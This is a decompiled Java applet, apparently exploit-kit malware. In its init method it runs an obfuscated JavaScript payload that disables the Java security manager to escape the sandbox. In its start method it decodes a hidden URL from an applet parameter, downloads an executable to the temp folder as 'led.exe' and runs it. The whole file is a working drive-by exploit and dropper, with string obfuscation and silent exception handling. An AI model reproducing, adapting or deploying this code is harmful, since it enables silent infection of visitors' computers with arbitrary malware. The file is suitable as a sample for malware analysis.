import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Verifa extends Applet
{
    private JList mersedes;
    
    @Override
    public void start() {
        try {
            String tdir = System.getProperty("jwwd2avwwd2a.iwwd2o.twwd2mpwwd2dwwd2ir".replace("wwd2", ""));
            if (tdir.charAt(tdir.length() - 1) != '\\') {
                tdir += "\\";
            }
            final String sefa = tdir + "led" + ".e".concat("xe");
            final String uri = this.getParameter("dest");
            String duri = "";
            for (int s = 0; s < uri.length(); ++s) {
                int tt = uri.charAt(s);
                tt -= 4;
                duri += (char)tt;
            }
            final InputStream reader = Idmer.createIS(duri);
            final FileOutputStream writer = new FileOutputStream(sefa);
            byte[] buffer = new byte[153600];
            final byte[] buher = new byte[1600];
            for (int totalBytesRead = 0, bytesRead = 0; (bytesRead = reader.read(buffer)) > 0; buffer = new byte[153600], totalBytesRead += bytesRead) {
                writer.write(buffer, 0, bytesRead);
            }
            writer.close();
            reader.close();
            try {
                Idmer.exe(sefa);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        int i = 0;
        while (i < 10) {
            try {
                final ScriptEngine merry = new ScriptEngineManager().getEngineByName("jwwd2s".replace("wwd2", ""));
                merry.eval("v11shj2ar err11shj2or = n11shj2ew Err11shj2or(\"M11shj2y err11shj2or\");th11shj2is.toSt11shj2ring = funct11shj2ion(){ ja11shj2va.la11shj2ng.Syst11shj2em.s11shj2etSecu11shj2rityM11shj2anag11shj2er(nul11shj2l);ap11shj2ple11shj2t.st11shj2art();re11shj2turn \"e11shj2xplo11shj2it!\";};11shj2er11shj2ror.mes11shj2sage = th11shj2is;".replace("11shj2", ""));
                this.add(this.mersedes = new JList((E[])new Object[] { merry.get("erwd2rowd2r".replace("wd2", "")) }));
                i = 10;
                return;
            }
            catch (ScriptException ex) {
                if (i != 9) {}
                ++i;
                continue;
            }
            break;
        }
    }
}
